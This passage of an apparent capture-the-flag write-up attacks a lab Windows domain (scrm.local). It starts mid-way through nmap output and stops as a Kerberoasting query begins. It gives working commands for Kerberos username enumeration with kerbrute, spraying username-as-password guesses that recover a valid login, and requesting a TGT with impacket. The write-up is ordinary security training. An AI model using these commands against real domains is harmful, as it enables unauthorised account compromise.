</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>4411/tcp  open  found?        syn-ack
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
</span></span><span style="display:flex;"><span>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
</span></span><span style="display:flex;"><span>|_    ERROR_UNKNOWN_COMMAND;
</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49706/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>59897/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port4411-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/20%Time<span style="color:#f92672">=</span>63290F81%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
</span></span><span style="display:flex;"><span>SF:LL,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,1D,<span style="color:#e6db74">&#34;SCRAMBLEC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDER
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,35,<span style="color:#e6db74">&#34;SCRAMBLEC
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,1D,<span style="color:#e6db74">&#34;SCR
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECOR
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:WN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLS
</span></span><span style="display:flex;"><span>SF:SessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,1D,<span style="color:#e6db74">&#34;SCRAM
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:BLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourO
</span></span><span style="display:flex;"><span>SF:hFourRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%
</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>LDAPBindReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,35,<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk
</span></span><span style="display:flex;"><span>SF:-RC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,1D,<span style="color:#e6db74">&#34;SCRAMB
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:LECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NotesRPC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,1D,<span style="color:#e6db74">&#34;S
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WMSRequest,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r
</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>ms-sql-s,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,1D,<span style="color:#e6db74">&#34;SCRAMBLECOR
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>giop,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| ms-sql-info: 
</span></span><span style="display:flex;"><span>|   10.10.11.168:1433: 
</span></span><span style="display:flex;"><span>|     Version: 
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>|       Service pack level: RTM
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 42300/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>port 10436/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 55122/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 31813/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2022-09-20T01:07:39
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3.1.1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 9m34s, deviation: 0s, median: 9m33s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Tue Sep 20 03:58:42 2022 -- 1 IP address (1 host up) scanned in 512.62 seconds</span></span></span></code></pre></div>
<p>We can see the usual windows ports are open in addition to port 80 indicating the presence of a webserver and another weird port 4411 which nmap couldn&rsquo;t identify</p>
<p>We can also see the domain name leaked by ldap (port 389) <em>scrm.local</em> and the domain controller name <em>DC1.scrm.local</em>, so we&rsquo;ll add these to the <em>/etc/hosts</em> file.</p>
<h3 id="webserver-enumeration">WebServer Enumeration</h3>
<p>Moving on to the webserver, the first thing I did is to enumerate subdomains while surfing the page but I got nothing.</p>
<p>Next let&rsquo;s see what the site hides:</p>
<p><img src="scrm.local-home-page.png" alt="Home Page"></p>
<p><img src="scrm.local-it-service-page.png" alt="IT Services Page"></p>
<p>Looking at the <em>IT Support Page</em> we see that NTLM authentication is disabled. This might come in handy if we get any sort of errors when trying to authenticate later.</p>
<p><img src="scrm.local-contacting-it-support-page.png" alt="Contacting IT Support Page"></p>
<p><img src="scrm.local-sales-order-app-troubleshooting-page.png" alt="Sales Order App Troubleshooting Page"></p>
<p><img src="scrm.local-password-resets-page.png" alt="Password Resets Page"></p>
<p>Moving to other pages, it looks like they are having some troubles, after the breach and they are running some sort of custom application on port 4411 that nmap couldn&rsquo;t identify before. We also got a valid email <em><a href="mailto:support@scrm.local">support@scrm.local</a></em></p>
<p><img src="scrm.local-new-user-account-page.png" alt="New User Page"></p>
<p>On the <em>New User Account Page</em> we have a form but I couldn&rsquo;t get any result from it.</p>
<p>I did try directory bruteforcing but again no results.
The same goes for fuzzing the application on port <em>4411</em>.</p>
<h3 id="usernamepassword-bruteforce">Username/Password Bruteforce</h3>
<p>From here, I thought of using kerberos authentication to bruteforce usernames and maybe passwords also.</p>
<p>Usually I start enumerating usernames using <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt"><em>seclists/Usernames/xato-net-10-million-usernames.txt</em></a> which is a long list of various usernames to see how usernames look like <em>for example if they use [First Name].[Last Name] or [First Initial].[Last Name] &hellip;</em>, however by looking at the previous terminal screenshot, I can see that <em>ksimpson</em> might be a valid username, so I can assume that usernames are of form <em>[First Initial][Last Name]</em></p>
<p>Now I can use <a href="https://github.com/ropnop/kerbrute"><em>kerbrute</em></a> with a specific wordlist, like the ones from <a href="https://github.com/attackdebris/kerberos_enum_userlists"><em>kerberos_enum_userlists</em></a>, specifically I&rsquo;ll use <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt"><em>A-ZSurnames.txt</em></a> since I know this is how most likely usernames will be.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute/kerbrute_linux_amd64 userenum -d scrm.local --dc dc1.scrm.local /opt/kerberos_enum_userlists/A-ZSurnames.txt 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 10/01/22 - Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 01:52:59 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2022/10/01 01:52:59 &gt;  	dc1.scrm.local:88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 01:53:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	ASMITH@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	JHALL@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:08 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KSIMPSON@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KHICKS@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:55:05 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	SJENKINS@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:55:56 &gt;  Done! Tested <span style="color:#ae81ff">13000</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> valid<span style="color:#f92672">)</span> in 176.760 seconds</span></span></code></pre></div>
<p>After getting these few results, I thought of doing a simple password guessing attack where I&rsquo;ll try to login using the username as the password, having different case sensitivity. What I mean is the following:</p>
<ul>
<li>
<p>First I&rsquo;ll copy these results to a temporarily file called <em>tmp</em>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp 
</span></span><span style="display:flex;"><span>2022/10/01 01:53:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	ASMITH@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	JHALL@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:08 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KSIMPSON@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:54:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KHICKS@scrm.local
</span></span><span style="display:flex;"><span>2022/10/01 01:55:05 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	SJENKINS@scrm.local</span></span></code></pre></div></p>
</li>
<li>
<p>Then I&rsquo;ll generate a simple <em>username:password</em> list <em>(of usernames as passwords but having different case sensitivity)</em> because <a href="https://github.com/ropnop/kerbrute"><em>kerbrute</em></a> accepts using this format for bruteforcing
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | awk -F<span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#e6db74">&#39;{print $1&#34;:&#34;$1&#34;\n&#34;$1&#34;:&#34;tolower($1)&#34;\n&#34;$1&#34;:&#34;substr($1,0,1)tolower(substr($1,2))&#34;\n&#34;$1&#34;:&#34;substr($1,0,2)tolower(substr($1,3))}&#39;</span>
</span></span><span style="display:flex;"><span>ASMITH:ASMITH
</span></span><span style="display:flex;"><span>ASMITH:asmith
</span></span><span style="display:flex;"><span>ASMITH:Asmith
</span></span><span style="display:flex;"><span>ASMITH:ASmith
</span></span><span style="display:flex;"><span>JHALL:JHALL
</span></span><span style="display:flex;"><span>JHALL:jhall
</span></span><span style="display:flex;"><span>JHALL:Jhall
</span></span><span style="display:flex;"><span>JHALL:JHall
</span></span><span style="display:flex;"><span>KSIMPSON:KSIMPSON
</span></span><span style="display:flex;"><span>KSIMPSON:ksimpson
</span></span><span style="display:flex;"><span>KSIMPSON:Ksimpson
</span></span><span style="display:flex;"><span>KSIMPSON:KSimpson
</span></span><span style="display:flex;"><span>KHICKS:KHICKS
</span></span><span style="display:flex;"><span>KHICKS:khicks
</span></span><span style="display:flex;"><span>KHICKS:Khicks
</span></span><span style="display:flex;"><span>KHICKS:KHicks
</span></span><span style="display:flex;"><span>SJENKINS:SJENKINS
</span></span><span style="display:flex;"><span>SJENKINS:sjenkins
</span></span><span style="display:flex;"><span>SJENKINS:Sjenkins
</span></span><span style="display:flex;"><span>SJENKINS:SJenkins</span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | awk -F<span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#e6db74">&#39;{print $1&#34;:&#34;$1&#34;\n&#34;$1&#34;:&#34;tolower($1)&#34;\n&#34;$1&#34;:&#34;substr($1,0,1)tolower(substr($1,2))&#34;\n&#34;$1&#34;:&#34;substr($1,0,2)tolower(substr($1,3))}&#39;</span> &gt; users-passwords.txt</span></span></code></pre></div></p>
</li>
<li>
<p>Using this method, I will try <em>4 invalid login attemps</em> per account which will most likely not trigger any account lockout.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute/kerbrute_linux_amd64 bruteforce --dc dc1.scrm.local -d scrm.local users-passwords.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 10/01/22 - Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 02:17:29 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>2022/10/01 02:17:29 &gt;  	dc1.scrm.local:88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/10/01 02:17:30 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID LOGIN:	KSIMPSON@scrm.local:ksimpson
</span></span><span style="display:flex;"><span>2022/10/01 02:17:30 &gt;  Done! Tested <span style="color:#ae81ff">20</span> logins <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> successes<span style="color:#f92672">)</span> in 0.831 seconds</span></span></code></pre></div></p>
</li>
</ul>
<p>And we got a valid hit!! However I can&rsquo;t use these credentials directly because <em>NTLM authentication is disabled</em>, so I had to think of other solutions, like using kerberos tickets to interact with the domain.</p>
<h2 id="tgt-request">TGT Request</h2>
<p>To do that I need to request a <em>Ticket Granting Ticket</em> from the domain controller, which I will use to authenticate to other services like LDAP.
For this I will use <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py -dc-ip dc1.scrm.local scrm/ksimpson:ksimpson
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in ksimpson.ccache</span></span></code></pre></div></p>
<p>And to use this ticket, I need to store it in an environment variable that impacket uses by default
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py --help
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>-k                    Use Kerberos authentication. Grabs credentials from ccache file <span style="color:#f92672">(</span>KRB5CCNAME<span style="color:#f92672">)</span> based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>ksimpson.ccache</span></span></code></pre></div></p>
<h2 id="kerberosting-attack">Kerberosting Attack</h2>
<p>From here, using <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a> I can now query <em>LDAP</em> for different information, so I&rsquo;ll look for any <em>Service Principal Names</em> to see if <a href="https://youtu.be/xH5T9-m9QXw"><em>kerberosting attack</em></a> might work.</p>
<ul>
<li>Note: If you&rsquo;re following along using older versions of impacket (&lt;0.9.25) and you&rsquo;re getting an error like <em>&hellip; derived from BaseException &hellip;</em> then you can either clone the newer version of <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a> or follow the <a href="https://github.com/SecureAuthCorp/impacket/issues/1206"><em>solution</em></a> proposed by the author of this machine. For this write-up, I will use the newer version of impacket 0.10.1 as of the time of writing this.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
